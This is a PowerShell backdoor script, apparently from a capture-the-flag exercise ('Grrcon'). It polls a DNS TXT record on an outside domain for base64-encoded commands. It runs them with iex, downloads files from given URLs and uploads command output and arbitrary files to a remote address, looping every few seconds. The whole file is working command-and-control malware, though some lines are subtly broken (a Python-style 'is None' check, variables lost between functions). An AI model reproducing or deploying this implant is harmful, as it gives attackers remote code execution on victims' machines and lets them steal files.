$wp = $env:LOCALAPPDATA + "\Grrcon\"
if (!(Test-Path $wp)) {
        New-Item -ItemType Directory -Force -Path $wp
}

function query(){
    $query = Resolve-DnsName -Type TXT -Name down.thomassomerville.com
    $results = $query.strings -split ","
    $address = $results[0]
    $port = $results[1]
    $cmd = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($results[2]))
}
function runcommand(){
    if ($cmd is None) {
        query
    }
    if ($cmd.StartsWith("EXEC=")){
        $exec = iex($cmd.substring(5))
        $logpath = $wp + "execlog.txt"
        $exec | Out-File -FilePath $logpath
        sendData($logpath)   
    }
    if ($cmd.StartsWith("RUN=")){
        iex($cmd.substring(4))
    }
    if ($cmd.StartsWith("DOWN=")){
        $downCMD = $cmd.substring(5) -split ","
        Invoke-WebRequest -Uri $downCMD[0] -OutFile $downCMD[1]    
    }
    if ($cmd.StartsWith("PUT=")){
        $putCMD = $cmd.substring(4) -split ","
        sendData($putCMD[0])
    }
}
function sendData($datatosend) {
        $url = "http://"+$address+":"+$port
        $wc = New-Object System.Net.WebClient
        $wc.UploadFile($url,$datatosend)
}
While ($True){
    Start-Sleep -s 5
    query
    Start-Sleep -s 1
    runcommand
}

